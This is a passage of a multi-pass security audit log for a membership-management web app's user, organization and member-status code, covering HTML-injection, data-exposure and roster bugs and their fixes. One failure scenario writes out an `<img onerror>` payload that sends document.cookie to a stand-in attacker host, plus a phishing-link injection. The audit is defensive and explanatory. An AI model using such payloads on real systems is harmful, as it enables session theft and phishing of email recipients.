same already-audited third category ORU-8b/pass-1's route inventory
documents for `/settings`, `/modules`, `/profile`, and the values they
return (an ID-format prefix/next-number preview) carry no PII or secret.

**Route-count reconciliation:** `users.py` 24→26 and `organizations.py`
19→20 against pass 3's stated totals, with **zero** line-level diff on either
file between pass 3's merge commit and the membership-id routes' introduction
— i.e., the code was already live at pass 3's review point and pass 3's own
count was short by two and one respectively, not a new addition slipping
through unreviewed. Confirmed by `git diff b267ee1..HEAD --stat` returning
empty for `organizations.py`/`schemas/organization.py` entirely, and only the
six-site defense-in-depth diff for `users.py`. Each of the newly-counted
routes was individually re-verified this pass regardless (membership-id ×3
above; the remaining users.py discrepancy is `get_deletion_impact`, already
covered under pass 1's "Verified good" ceiling/redaction sweep by file
but not previously named in a per-route count).

**Not re-read line-by-line:** `organization_service.py`'s non-module-settings,
non-membership-id methods — no diff signal since pass 3 pointed at either;
`schemas/organization.py` — zero diff since pass 3.

## Findings (pass 4)

### USR-9 — MED — The property-return-drop email's fallback template interpolated `reason`/`member_name`/`performed_by_name` into HTML with no escaping, and the same `re.sub` call would raise on a literal backslash-digit sequence in that text — ✅ FIXED

**What:** `_send_property_return_email` (`member_status.py`) sends the
formal "membership status changed to dropped" notice to the departed
member's own email address(es) and to every admin role in
`ADMIN_NOTIFY_ROLE_SLUGS` (CC), for every `dropped_voluntary`/
`dropped_involuntary` status change (`PATCH /users/{user_id}/status`,
`members.manage`-gated). When the organization has never opened the Email
Templates admin screen — `ensure_default_templates()` is only called from
`GET /email-templates`, so no `MEMBER_DROPPED` row exists in most
departments that haven't customized their notification wording — the
function falls back to `DEFAULT_MEMBER_DROPPED_HTML`/`_TEXT` and builds the
message itself with a raw `re.sub(pattern, str(val), rendered_html)` loop,
**bypassing** `EmailTemplateService.render()`/`_replace_variables()`, which
is the one place in this codebase that HTML-escapes template context values
(and is exactly what runs instead when a custom template _does_ exist — so
the two code paths for the same email disagreed on escaping). `reason` is
the officer's own free-text field on the status-change request; `member_name`
and `performed_by_name` are stored `full_name` values which are themselves
ordinary editable profile fields. None of the three were escaped before
being spliced into the HTML body.

A second defect in the same loop compounds it: `re.sub`'s replacement
argument, when passed as a plain string (not a callable), undergoes its own
backslash processing — `\1`, `\g<name>`, etc. A `reason` containing a literal
backslash-digit sequence (plausible in ordinary text — "returned 3 of 4
items\1 outstanding", a pasted file path, a stray OCR artifact) raises
`re.error: invalid group reference` **inside the try/except that is supposed
to make this function never fail the drop itself** — confirmed by the guard
test below, which reproduced `invalid group reference 1 at position 46`
against the pre-fix code. The exception is caught and logged, so the drop
still succeeds, but the notification email silently never sends — the same
"switch is stored, nothing consumes it" failure shape as CLAUDE.md Pitfall
#19, one layer down.

**Where:** `backend/app/api/v1/endpoints/member_status.py:247-265` (now
`:247-283` after the fix).

**Failure scenario:** an officer holding `members.manage` (a role held far
more broadly than `settings.manage` — every `membership_coordinator`,
`secretary`, `president`, and several others) drops a member with
`reason: "<img src=x onerror=fetch('https://evil.example/c?d='+document.cookie)>"`
or, more realistically for a phishing angle most email clients cannot
script-block, a `reason` with injected `<a href="https://evil.example">`
markup styled to look like a legitimate "dispute this notice" link. The
formatted HTML notice — carrying that markup unescaped — reaches the
departed member's inbox and every CC'd admin's inbox. Separately, and
without any malicious intent at all, an officer typing an ordinary reason
that happens to contain a backslash-digit sequence silently loses the
notification entirely, with no error surfaced anywhere the officer can see
(the exception is caught inside a `BackgroundTasks` callback and only
`logger.error`'d).

**Impact:** MED. Not a cross-tenant leak, and not reachable by more than a
`members.manage` holder — but it is a live HTML-injection path into an
outbound notification reaching multiple recipients, on the fallback path
most departments actually use (no template customization needed to trigger
it), and it silently drops the notification for a plausible class of benign
input. Checklist §4 ("User text in email HTML is `html.escape`d") names this
class directly.

**Fix:** the fallback loop now `html.escape()`s every context value before
substituting into `rendered_html` (except `items_list_html`, which is
already pre-escaped markup built by `build_items_list_html` — matching
`_RAW_HTML_VARIABLES`'s treatment of the same key in
`email_template_service.py`, so the two rendering paths agree on which
values are markup and which are text). `rendered_text` is **not** escaped —
matching `_replace_variables`'s own `escape_html=False` rule for the plain-
text alternative, since escaping there would corrupt an ordinary name like
"O'Brien" for no security benefit (nothing there is parsed as markup). Both
substitutions now pass the replacement as a closure (`lambda _m, v=val: v`)
rather than a raw string, so a value cannot be misread as a backreference —
this is what fixes the `re.error` crash, independent of the escaping
question. Guarded by
`tests/test_member_status_transitions.py::test_default_property_return_email_escapes_html_but_not_text`,
which drives the real fallback path (a `TemplateService.get_template`
stub returning `None`, matching the "no customized template" condition) with
a `reason` containing both an unescaped `<img onerror>` payload and a literal
`\1`, and asserts: the markup is escaped in `html_body`, present verbatim in
`text_body`, and the backslash sequence survives in both without raising —
confirmed to fail against the pre-fix code (`KeyError` because the exception
was swallowed before `send_email` was ever called, with the exact
`invalid group reference 1 at position 46` logged) via `git stash`, and to
pass after the fix.

## Verified good ✅ (re-confirmed pass 4)

- **All privilege-ceiling wiring re-confirmed at its documented call sites**,
  read directly rather than taken on pass 1-3's word:
  `_enforce_role_grant_ceiling` in `create_member` and both
  `assign_user_roles`/`add_role_to_user`; `_enforce_rank_grant_ceiling` in
  `create_member` and `update_user_profile`'s rank-change branch (including
  the locked, `populate_existing=True` read and the `member_class`/
  administrative-rank consistency checks pass 2 added); `assign_user_roles`'s
  `assert_positions_retain_administrator` last-admin guard on a full-replace
  role assignment; `admin_reset_password`/`admin_reset_mfa`'s self-block
  (`if str(user_id) == str(current_user.id): raise 400`) plus
  `_enforce_account_reset_ceiling`.
- **Self-or-admin gating re-confirmed by direct read on every bare-`get_
current_user` mutation**: `update_contact_info`, `update_user_profile`,
  `upload_photo`, `delete_photo`, `get_user_consents`, `get_member_leaves` —
  each checks `str(current_user.id) == str(user_id)` before falling back to
  a permission check, and each subsequent DB fetch is org-scoped.
- **Every by-id fetch across all four files still org-scopes**, including
  the six sites pass 3 flagged for pass 4 to watch (`assign_user_roles`,
  `add_role_to_user`, `remove_role_from_user`, `update_contact_info`,
  `update_user_profile`'s post-commit re-reads) — now carrying an explicit,
  redundant `organization_id` clause from the separate tenancy burn-down
  (`1d580ea`), read directly rather than inferred from the commit message.
- **The one client-supplied FK on a create path (XC-1) still validated**:
  `create_leave_of_absence`'s `user_id`, unchanged since pass 2/3
  (`member_leave_service.py:108-118`).
- **`organizations.py` still has no by-id path parameter across all 20
  routes** (up one from pass 3's 19, reconciled above) — every response
  still derives exclusively from `current_user.organization_id`.
- **New membership-ID counter is correctly locked and deep-copied.**
  `OrganizationService.generate_next_membership_id` locks the organization
  row (`with_for_update()`) before reading the counter, matching CLAUDE.md
  Pitfall #27 (two concurrent member creations cannot mint duplicate IDs),
  and uses `copy.deepcopy(org.settings or {})` before mutating the nested
  `membership_id` key, matching Pitfall #12.
- **Secrets stay redacted; USR-5 and USR-8 re-verified still open, current
  line numbers unchanged** (no diff on either file/region since pass 3) —
  not re-flagged with new text, mirrored forward as-is.
- **No new `.ilike()`/`.like()`, raw `csv.writer`, or `window.confirm`/
  `alert`/`prompt`** in any of the four backend files or the new frontend
  settings module (grepped fresh this pass).

## Completion gate (pass 4)

| Check                                                                                                                                                                                           | Result                                                                                                                                                     |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `flake8 app/ tests/ alembic/`                                                                                                                                                                   | ✅ 0 violations                                                                                                                                            |
| `black --check app/ tests/ alembic/`                                                                                                                                                            | ✅ clean (1536 files unchanged)                                                                                                                            |
| `isort --check-only app/ tests/ alembic/` (9.0.1, CI's pin)                                                                                                                                     | ✅ clean                                                                                                                                                   |
| `validate_migrations.py --strict`                                                                                                                                                               | ✅ 438 revisions, single head — unchanged (no migration needed)                                                                                            |
| `pytest tests/ -k "member_status or member_leave or property_return or user_list or platoon or users or organization or rank_grant or role_edit or audit_history or ceiling or administrative"` | ✅ 433 passed, 1 skipped (pre-existing `py_vapid`), 0 failed                                                                                               |
| `pytest tests/` (full backend suite)                                                                                                                                                            | ✅ 11851 passed, 21 skipped (pre-existing/environmental: Docker daemon/registry unavailable, `py_vapid` optional dep, opt-in API-contract suite), 0 failed |
| `tsc --noEmit` (`npm run typecheck`, aliased-compiler wrapper)                                                                                                                                  | ✅ 0 errors                                                                                                                                                |
| `eslint .` (`npm run lint`)                                                                                                                                                                     | ✅ 0 errors, 2 pre-existing warnings (unrelated `CallTypeChips.tsx`), well under the max-warnings-10 threshold — no frontend file modified this pass       |

`npm ci` was run at the worktree root before the first `npm run lint`
attempt, per this rotation's known worktree quirk — the first attempt showed
1116 warnings from unresolved TypeScript types (a stale `node_modules`
resolution), which vanished entirely after `npm ci`, confirming it was the
documented false-positive noise and not a regression.

The USR-9 guard test was confirmed to fail against the pre-fix code via
`git stash` before being counted as covering the finding (reproduced both
halves: the escaping gap, via a `KeyError` on `captured["html_body"]`
because the exception below it was swallowed, and the `re.sub` crash itself,
logged as `invalid group reference 1 at position 46`).

---

## Pass 3 (2026-09-02)

**Scope:** full domain since pass 2's merge commit `6823bece` (PR #1949):
`endpoints/users.py`, `endpoints/organizations.py`, `endpoints/member_status.py`,
`endpoints/member_leaves.py`, `services/user_service.py`,
`services/organization_service.py`, `services/member_leave_service.py`,
`models/user.py`, `schemas/user.py`, `schemas/organization.py`, every
migration touching these tables since, and the in-app frontend surface (no
dedicated module directory, same as pass 1/2) — `git diff --stat` against
`frontend/src/` since `6823bece`, reviewed file by file for every match on
user/organization/member terms.

**Read in full (diff-driven):** the `users.py`/`models/user.py` diff since
pass 2 (the "stated one of two membership columns, refuse to guess the other"
guard added to `update_user_profile`, and `_reconcile_membership`'s "keep the
existing class/status when the split can't answer" fix); the
`schemas/organization.py` diff (the `testing` module flag); every changed
frontend file (`AddMember.tsx`, `ImportMembers.tsx`, `MemberAdminEditPage.tsx`,
`MemberIdCardPage.tsx`, `Members.tsx`, `userServices.ts`, `types/user.ts`,
`purgeLocalMemberData.ts`).

**Re-enumerated, not re-derived:** all 62 routes across the four files (24 +
19 + 12 + 7 — up one from pass 1's 61, the new
`update_user_profile` guard added no route) — every route's auth dependency
and permission string checked against the route inventory below. Every
by-id (`{user_id}`, `{leave_id}`) fetch in all four files traced for an
`organization_id` filter (CLAUDE.md Pitfall #14 / CHECKLIST XC-3), and every
client-supplied FK on a create path (`member_leaves.py`'s `create_leave_of_
absence` → `MemberLeaveService.create_leave`) traced for an in-org check
(XC-1). `organizations.py`'s 19 routes carry no by-id path parameter at all —
every one resolves exclusively off `current_user.organization_id`, so XC-3
does not apply to that file by construction; confirmed by reading all 19
handlers, not inferred from the file's shape.

**Re-verified against current code, not re-derived:** every pass-1/pass-2
"Verified good" claim below the by-id trace (privilege-ceiling wiring, PII
redaction, settings-secret redaction, the class/rank invariant's now-four
locked writers, USR-1…4 fixes). USR-5 (unbounded lists) and ORU-7c
(mass-escalatable `member` role) re-checked against current line numbers and
`KNOWN_LIMITATIONS.md` — both still open, unchanged, already mirrored; not
re-flagged.

**Not re-read line-by-line:** `member_status.py` lines 1–281 (imports/schemas/
helpers above the first route) and `organization_service.py`'s non-module-
settings methods — no diff signal since pass 2 pointed at either.

## Findings (pass 3)

### USR-7 — LOW — `GET /users` silently dropped `platoon` (and declared-but-unset `member_class`/`member_status`/`compliance_exempt`) from every roster response — ✅ FIXED

**What:** `UserListResponse` (`schemas/user.py:271-298`) declares `platoon`,
`member_class`, `member_status` and `compliance_exempt`, but
`UserService.get_users_for_organization` (`services/user_service.py:54-69`)
never set any of the four in the `user_dict` it builds per row — each one
came back as the schema's bare default (`None`/`False`) regardless of the
real column value, for every caller of `GET /users`.

**Where:** `services/user_service.py:54-69`.

**Failure scenario:** `PlatoonRosterPanel.tsx` (scheduling module) loads its
"current assignment" column straight from `GET /users`'s `platoon` field to
seed the officer's edit grid. Every member showed as unassigned regardless of
their actual platoon, and the panel's own "only send rows that changed" diff
compares against that same wrong baseline — an officer who didn't touch a row
believing it already showed the true value would leave it unset while
believing it was confirmed correct.

**Impact:** functional defect, not a permission or tenancy bug — reproducible
on any organization using platoon-based scheduling.

**Fix:** `platoon` added to the dict `UserListResponse` is built from,
matching what the schema already declares and the model already stores.
`member_class`/`member_status`/`compliance_exempt` deliberately left unset —
see USR-8, which found the same gap for those three but for a reason worth
weighing before it's fixed rather than incidentally: `compliance_exempt` in
particular is a more sensitive field to widen to every `members.view` holder
(every default position) than `platoon` is, and USR-8 is the same "should
this whole endpoint's field set be tiered by permission" decision. Guarded by
`tests/test_user_list_platoon.py` (2 tests):
`test_platoon_is_forwarded_from_the_real_column` (a non-null platoon)
confirmed to fail against the pre-fix code via `git stash` — pre-fix, the
column was never forwarded at all, so a real platoon value came back `None`.
`test_platoon_of_none_round_trips_as_none` does not itself discriminate
pre-fix from post-fix code (a `None` column value produced `None` in the
response either way — unset key vs. explicitly-set-to-`None` are
indistinguishable once serialized), so it is not counted as regression
evidence for this finding; it stays as a defensive assertion that an
explicit `None` isn't coerced into something else by a future change to
this mapping (Codex review on this PR, #2175).

### USR-8 — MED — `GET /users` sends the full admin-facing member record to every `members.view` holder; a 2026-09-01/02 frontend change frames a reduced "Member Directory" experience for that tier without any matching backend change — 🚩 FLAGGED

**What:** `members.view` is, per the route's own docstring
(`users.py:103-106`), "the baseline grant every default position carries" —
every member of the department holds it. `UserService.get_users_for_
organization` returns the same `UserListResponse` regardless of which of the
three OR-gated permissions (`users.view`, `members.view`, `members.manage`)
the caller holds, and that response unconditionally includes `username`,
`hire_date`, `membership_number`, `rank`, and `station` for every member in
the organization.

Since pass 2, `Members.tsx` was changed (comment at line ~36-41) to render a
visibly different experience by permission tier: a caller without
`members.manage` sees "Member Directory" / "Find and contact department
members" instead of "Membership Management", loses the username line, the
Hire Date column, the CSV export, bulk-select, and the edit/delete actions —
framed in the code comment as "administrative furniture ... a member without
the grant gets a directory; a coordinator gets the management table
unchanged." That framing describes an access-control boundary. No such
boundary exists server-side: the fields the directory-tier UI hides are still
in the JSON `GET /users` response reaching that caller's browser — visible in
the network tab, or to any script the member runs against their own
authenticated session — regardless of the UI's rendering choice.

**Where:** `services/user_service.py:24-91` (unconditional field set);
`schemas/user.py:271-298` (`UserListResponse`); `api/v1/endpoints/users.py:
99-155` (`list_users`, OR-gated on `members.view`); frontend framing at
`frontend/src/pages/Members.tsx:36-41`.

**Failure scenario:** a plain member (no `members.manage`, no `users.view`)
opens the roster, sees the reduced "Member Directory" the new UI presents,
and reasonably infers that a colleague's username, hire date, and membership
number are coordinator-only information. They are not: the same member can
open browser devtools' Network tab (or call `GET /api/v1/users` directly with
their own session cookie — no additional privilege needed) and read every
one of those fields, plus `rank`/`station`, for the entire roster. The
severity is capped by two things: this is disclosure _within_ the caller's
own organization (no cross-tenant leak — `get_users_for_organization` filters
on `current_user.organization_id` throughout), and none of the exposed
fields are on the leadership-only list `GET /{user_id}/with-roles` already
enforces (DOB, emergency contacts) — but the mismatch between the new UI's
implied tiering and the actual wire payload is real and user-visible to
anyone who looks.

**Impact:** MED — org-internal PII over-exposure relative to the access
model the newest UI change now implies, not a cross-tenant or unauthenticated
leak. Also interacts with USR-7: `member_class`/`member_status`/
`compliance_exempt` are declared on the same response and were found
similarly unpopulated (fixed for a different reason there); populating them
now, before this is resolved, would extend the same over-exposure to a
plausibly more sensitive field (`compliance_exempt` reads as a compliance/
medical-tracking exemption) with no product decision behind it — left unset
for that reason.

**Fix:** not applied. `GET /users` is consumed by at least 25 frontend files
(scheduling rosters, messaging composer, election nominations, meeting
attendance, waiver management, shift reports, and more) via the shared
`userService.getUsers()` call, several of which need fields (`rank`,
`station`, `platoon`) that a naive "trim to `members.manage`" would also
strip from those legitimate, non-directory consumers — this is a response-
shape/product decision (which fields belong at the `members.view` tier vs.
`members.manage`, and whether `GET /users` should serve two shapes by
permission or a second, narrower directory endpoint should be split out),
the same category of call left flagged for FIN-7/ELEC-12/USR-5/MP-10/MS-6.
Mirrored into `KNOWN_LIMITATIONS.md`.

**Owner decision (2026-10-05): split a narrow directory endpoint for
Members.tsx's non-manager view; other callers unchanged.** `GET
/users/directory` (`members.view` / `users.view` / `members.manage`) returns
`MemberDirectoryEntry` — names, membership number, photo, status, rank, and
email/phone/mobile under the department ceiling **and** each member's own
choice — and nothing else: no `username`, `hire_date`, `station`, `platoon`,
`membership_type`, classification or `organization_id`. `Members.tsx` loads it
for a viewer without `members.manage`, so what the directory hides is no
longer in that page's response (`tests/test_member_directory_endpoint.py`,
`Members.test.tsx`). **Residual, accepted with the decision:** `GET /users`
keeps its full shape at `members.view` for its 25+ other callers, so a member
who calls it directly still reads those fields; the owner chose not to change
that contract.

## Verified good ✅ (re-confirmed pass 3)

- **Every by-id fetch across all four files org-scopes.** Traced individually
  in `users.py` (`get_user_roles`, `assign_user_roles`, `add_role_to_user`,
  `remove_role_from_user`, `get_user_with_roles`, `update_contact_info`,
  `update_user_profile`, `delete_user`, `admin_reset_password`,
  `admin_reset_mfa`, `upload_photo`, `delete_photo`,
  `get_member_audit_history`, `anonymize_member` (via
  `MemberAnonymizationService.get_user_for_anonymization`, org_id passed
  explicitly), `get_user_consents`), `member_status.py`
  (`change_member_status`, `get_property_return_preview`, `archive_member`,
  `reactivate_member` (via service), `change_membership_type`,
  `set_compliance_exemption`), and `member_leaves.py` (`get_member_leaves`,
  `update_leave_of_absence`/`delete_leave_of_absence` via
  `MemberLeaveService.get_leave`, both of which filter
  `organization_id == organization_id` at `member_leave_service.py:182-188`).
  No exception found.
- **The one client-supplied FK on a create path is validated in-org (XC-1).**
  `create_leave_of_absence`'s `user_id` is checked against the caller's org
  inside `MemberLeaveService.create_leave` (`member_leave_service.py:108-118`,
  `SELECT User.id WHERE id = :user_id AND organization_id = :organization_id`,
  raises `ValueError` → 400 if absent) before the leave (and its linked
  training waiver) is written — confirmed present and unchanged since pass 2.
- **The class/rank invariant now has a fourth guard, and it holds.**
  `update_user_profile`'s new "stated one of `member_class`/`member_status`,
  refuse to guess the other" check (`users.py:1571-1592`) and
  `_reconcile_membership`'s matching "keep the existing class/status when
  `split_membership_type` can't answer, don't overwrite with `None`"
  (`models/user.py:588-594`) were read in full, cross-checked against the
  documented failure mode (`('senior', None, None)` silently becoming
  `('active', 'operational', 'regular')` on a status-only PATCH), and found
  correctly guarded by existing tests in `test_membership_class_status.py`.
- **`organizations.py` has no by-id path parameter across all 19 routes** —
  confirmed by reading every handler, not inferred from route shapes alone;
  every response is derived exclusively from `current_user.organization_id`,
  so cross-tenant IDOR (XC-3) does not apply to this file's surface.
- **Secrets stay redacted; infrastructure identifiers stay gated on
  `settings.manage`.** `GET /settings` calls `.redacted()` then
  `.without_infrastructure()` for non-`settings.manage` callers
  (`organizations.py:70-79`); `PATCH /settings/email`, `/settings/file-storage`,
  `/settings/auth` each return `.redacted()`, never the raw payload
  (`organizations.py:241,283,326`) — unchanged since pass 1's ORU-2/3/5/8b,
  re-read directly rather than taken on the prior pass's word.
- **`JSON` settings mutation still deep-copies.** `update_module_settings`
  and its siblings in `organization_service.py` (`:397`, `:494`, `:548`) all
  `copy.deepcopy(org.settings or {})` before mutating, never a shallow
  `dict()` — Pitfall #12 holds; the new `testing` module flag flows through
  the same path and needs no migration (module toggles live in the JSON
  `settings` column, not a dedicated column).
- **No new `.ilike()`/`.like()` or raw `csv.writer` in any of the four files**
  (grepped fresh this pass — 0 hits either way).
- **USR-5 (unbounded lists) unchanged, still open, still mirrored.** Verified
  current line numbers still match: `get_archived_members`
  (`member_status.py:738-747`), `list_users_with_roles`
  (`users.py` — `.scalars().all()` at the loader), `leave_widget_summary`
  (`member_leaves.py:58-70`), `MemberLeaveService.list_leaves`
  (`member_leave_service.py:167-176`, sliced in-memory by callers).
- **ORU-7c (org-wide `member` role mass-escalation) unchanged, still a
  documented product decision, not a defect** — `KNOWN_LIMITATIONS.md`
  entry re-read, still accurate.

## Completion gate (pass 3)

| Check                                                                                                                                                                                        | Result                                                                                                                                                    |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `flake8 app/ tests/ alembic/`                                                                                                                                                                | ✅ 0 violations                                                                                                                                           |
| `black --check app/ tests/ alembic/`                                                                                                                                                         | ✅ clean (1387 files unchanged)                                                                                                                           |
| `isort --check-only app/ tests/ alembic/` (9.0.1, CI's pin)                                                                                                                                  | ✅ clean                                                                                                                                                  |
| `validate_migrations.py --strict`                                                                                                                                                            | ✅ 409 revisions, single head — unchanged (no migration needed)                                                                                           |
| `pytest tests/ -k "users or user_list or organization or member_status or member_leave or member_class or platoon or rank_grant or role_edit or audit_history or ceiling or administrative"` | ✅ 323 passed, 1 skipped (pre-existing `py_vapid`), 0 failed                                                                                              |
| `pytest tests/` (full backend suite)                                                                                                                                                         | ✅ 9833 passed, 21 skipped (pre-existing/environmental: Docker daemon/registry unavailable, `py_vapid` optional dep, opt-in API-contract suite), 0 failed |
| `tsc --noEmit`                                                                                                                                                                               | ✅ 0 errors                                                                                                                                               |
| `eslint .`                                                                                                                                                                                   | ✅ 0 errors/warnings (no frontend file modified this pass)                                                                                                |

Every new/modified guard test counted as covering its finding was confirmed
to fail against the pre-fix code via `git stash` — the one exception is
noted where it occurs (USR-7's `test_platoon_of_none_round_trips_as_none`,
which by construction cannot distinguish pre-fix from post-fix code and is
not counted as regression evidence).

---

## Pass 2 (2026-08-27)

Scoped to the **full domain** since pass 1's merge commit (`5f610f1f`,
PR #1814): `endpoints/users.py`, `endpoints/organizations.py`,
`endpoints/member_status.py`, `endpoints/member_leaves.py`,
`services/user_service.py`, `services/organization_service.py`,
`models/user.py`, `schemas/user.py`, every migration since (checked by
content, not filename), and — since this module has **no dedicated
frontend module directory** (noted in pass 1's own scope, and exactly the
condition that hid `BallotBuilder.tsx` from ELEC-06's first pass) — a
`git diff --stat` against `frontend/src/` broadly, grepped for
user/organization/rank/membership terms, rather than any directory glob.

Two real feature changes since pass 1, both reviewed in full:

- **The member-class/status split** (`20260826_1400_f1a2b3c4d5e6`,
  already read in full during ELEC-06's pass 2 for its voter-eligibility
  angle) reaches this module directly: `models/user.py` owns the
  `member_class`/`member_status` columns and the `_reconcile_membership`
  listener, and `users.py`/`member_status.py`/`schemas/user.py` are where
  a client actually sets them. Re-read from this module's angle
  (authorization and tenant isolation, not eligibility):
  - `MembershipClassificationFields`' two field validators reject any
    value outside the closed `MemberClass`/`MemberStatus` vocabularies —
    a typo 422s rather than silently landing a member in no class at all
    (unlike `membership_type`, which doubles as a free-form,
    org-configurable tier id and genuinely cannot be enum-constrained;
    confirmed by reading `split_membership_type`'s own docstring on why).
  - `member_class`/`member_status` were added to `update_user_profile`'s
    `restricted_fields` set — gated behind the same
    leadership/secretary/membership-coordinator check as `rank`,
    `hire_date`, `station`. Without this, any `users.edit` holder could
    move themselves from social/administrative into operational and vote
    on ballots restricted to that class. Also added to the actual
    `allowed_fields` write-set below the gate — the two sets are
    separate, and a field present in one but not the other is a real,
    previously-seen bug shape in this codebase (a permission-checked,
    audited request that silently no-ops). Confirmed both sets agree.
  - **A cross-endpoint race the first draft called closed — it wasn't,
    on three separate counts (Codex, all confirmed and fixed).** An
    administrative member holds no operational rank — a rank's default
    permissions are unioned into effective permissions regardless of
    class, so an unranked-by-policy administrative member with a rank
    would carry chain-of-command authority they are by definition outside
    of. Setting a rank and setting the class to administrative are
    different requests that can each read an operational, rankless
    member, each pass their own check, and each write only their own
    column — landing a row that is administrative _and_ ranked, which
    neither request alone would have allowed.
    1. **A fourth, unlocked writer.** `MembershipTierService.advance_all`
       — the scheduled/unattended tier-advancement scan — also clears
       rank on a move into an administrative tier, but its batch
       `select(User)` carried no `.with_for_update()` at all. The
       `TestEveryWriterIsCovered`/`TestTheTwoWritersSerialize` tests this
       pass's first draft cited as proof only covered three writers,
       not four, and never actually asserted the fourth's lock (which did
       not exist). Fixed: each member `advance_all` is about to mutate is
       now re-selected with `.with_for_update()` immediately before the
       write, re-checking eligibility under the lock rather than locking
       the whole batch upfront (hundreds of rows for the scan's whole
       duration would have been its own contention problem). Guarded by
       a new `TestTheTwoWritersSerialize` test asserting the lock via
       source inspection.

    2. **The lock alone wasn't enough on a self-update.** Neither locking
       `SELECT` in `update_user_profile`/`change_membership_type` carried
       `populate_existing=True`. On a self-update specifically,
       `get_current_user` already loaded the same `User` row into this
       request's session; with `expire_on_commit=False` (`core/database.py`)
       that instance sits in the identity map, and a re-`SELECT` for a row
       already there returns the cached pre-lock object without copying
       the new row's columns onto it — the lock is acquired at the SQL
       level, but `user.member_class`/`user.rank` could still read
       whatever they were before a concurrent request's commit. The exact
       shape ELEC-06 already found and fixed in `quorum_service.py`; this
       file hadn't caught up. Fixed on both locking reads.

    3. **An explicit `member_class: null` was judged against the wrong
       value.** `resulting_class = update_data.get("member_class") or user.member_class`
       can't distinguish "the client omitted this
       field" from "the client explicitly cleared it" — both read back as
       `None` from `.get()`. An explicit null is a request to reset to
       `DEFAULT_CLASS` (operational, per `_reconcile_membership`), not
       "leave the old class in place" — so clearing an administrative
       member's class while assigning a rank in the same request was
       wrongly refused, judged against the stale administrative value
       instead of the operational one the save would actually land on.
       Fixed by checking `"member_class" in update_data` before falling
       back to the stored value.

    All three fixed and guarded:
    `test_the_automatic_tier_advancement_locks_each_member_it_advances`,
    `populate_existing` assertions added to the two existing lock tests,
    and `test_an_explicit_null_class_is_judged_as_the_resulting_default`
    (all `test_administrative_rank_restriction.py`).

  - `_canonical_rank_or_400` closes a real, previously-live gap:
    `User.rank` is a plain unconstrained `String(100)`, so a typo'd rank
    silently resolved to no eligible seats and no default permissions
    (looks like the app is broken, not like a typo). Now resolved through
    `OperationalRankService.resolve_rank_code` at write time, on every
    writer (`create_member`, `update_user_profile`) — confirmed the
    canonicalized value is what gets persisted, not the caller's original
    string, which is the exact reuse of a checked-then-discarded value
    that would have re-created the bug one layer down.
  - `_valid_emails`/scheduling-settings reconstruction in
    `organization_service.py` is a read-path robustness fix (a legacy
    `cc_emails` value saved before `EmailStr` tightened the field no
    longer raises on every future settings read for that org, including
    an unrelated module toggle) — confirmed read-only, never on the write
    path, which stays strictly validated.
  - `_trusted_stored_modules`/the module-settings dual-write recovery
    logic: re-derived the "empty dict vs. real all-off configuration"
    distinction (Pitfall #19 territory) and confirmed the two callers
    (`_resolve_module_settings`, `get_enabled_modules`'s new `configured`
    field) share the one implementation rather than risking drift.

- **`schemas/user.py` — a production-breaking regression the first draft
  read straight past (Codex, P1).** Refactoring `AdminUserCreate` to
  inherit `MembershipClassificationFields` also silently dropped
  `password`, `role_ids`, `send_welcome_email`, every address field
  (`address_street`/`_city`/`_state`/`_zip`/`_country`), and
  `emergency_contacts` — fields the diff's own removed lines showed, but
  the first pass never checked against what `create_member` actually
  reads. Pydantic discards a request key the schema no longer declares,
  so `POST /api/v1/users` reached `if user_data.password` with no such
  attribute and raised `AttributeError` on every single call — **member
  creation was completely broken** on `main`. Fixed by restoring the
  dropped fields to `AdminUserCreate`. Every existing test for this route
  was source-inspection style (asserting a ceiling-check call appears in
  the right order), so none of them constructed a real schema instance or
  would ever have caught a field silently disappearing — confirmed by
  checking each one before concluding this needed a new test, not a
  stronger assertion on an existing one. Guarded by
  `test_create_member_reads_only_declared_admin_user_create_fields`
  (`test_privilege_ceiling_wiring.py`): extracts every `user_data.<attr>`
  access from the route's own source via regex and asserts each is a
  field `AdminUserCreate` declares, so a hardcoded field list can't rot
  out of sync with either side and the two can never drift silently
  again.
- **`frontend/src/hooks/ranksCache.ts`/`useRanks.ts` — a real prior bug
  fixed, not introduced.** The rank list cache was previously a single
  module-level variable shared across the whole browser session,
  unscoped by organization — a user who switched organizations without a
  full page reload could see the _previous_ org's rank list in a
  rank-selection dropdown. Now keyed by `(organizationId, activeOnly)`.
  Also guards the exact stale-response race this rotation's AUTH-3 found
  in `PhotoUseConsentPage.tsx` (a ref holding the current cache key,
  checked before an async fetch's result is applied) — confirmed present
  and correct by direct read, and covered by a dedicated
  `does not expose ranks cached for another organization` test.

**5 real findings, all fixed** (a production-breaking schema regression,
three separate gaps in the class/rank invariant's enforcement — an
unlocked fourth writer, a missing `populate_existing` on the two locked
ones, and an explicit-null misjudgment — caught across two Codex review
rounds on this PR). Everything else read either closed a real,
previously-live gap (unconstrained rank strings, cross-org rank-cache
leakage, a read-path settings crash) or correctly re-derived an
already-solved pattern from elsewhere in the codebase (Pitfall #19
dual-write recovery, the stale-response ref guard). All fixes
independently verified against the real code (reproduced the
`AttributeError` directly, traced the identity-map/`expire_on_commit`
behavior the same way as the ELEC-06 quorum fix, traced
`model_dump(exclude_unset=True)`'s omitted-vs-null distinction) before
fixing — not taken on Codex's word.

**Completion gate (pass 2):** flake8/black/isort clean on `app/ tests/
alembic/`; `validate_migrations.py --strict` passed (single head); scoped
backend tests (`-k "users or organization or member_status or
member_class or rank or administrative or tier"`) 430 passed, 1 skipped
(pre-existing), 0 failed; full backend suite 9110 passed, 22 skipped
(pre-existing), 0 failed; `tsc --noEmit` 0 errors; `eslint` on every
changed frontend file 0 errors; `vitest run` on the two new/changed
frontend test files 9 passed. Every new/modified guard test confirmed to
fail against the pre-fix code via `git stash` before being counted as
covering its finding.

---

## Pass 1 (2026-08-25)

**Backend:** `api/v1/endpoints/users.py` (2,484 L, 23 routes),
`api/v1/endpoints/organizations.py` (1,272 L, 19 routes),
`api/v1/endpoints/member_status.py` (1,046 L, 12 routes),
`api/v1/endpoints/member_leaves.py` (297 L, 7 routes) — 61 routes total
**Frontend:** (in-app, no dedicated module directory)
**Migrations:** `users`/`organizations` are initial-schema tables;
`member_leaves_of_absence` has its own creating migration
(`20260220_0300_add_member_leaves_of_absence.py`). See Schema & migration
notes.

---

## Scope

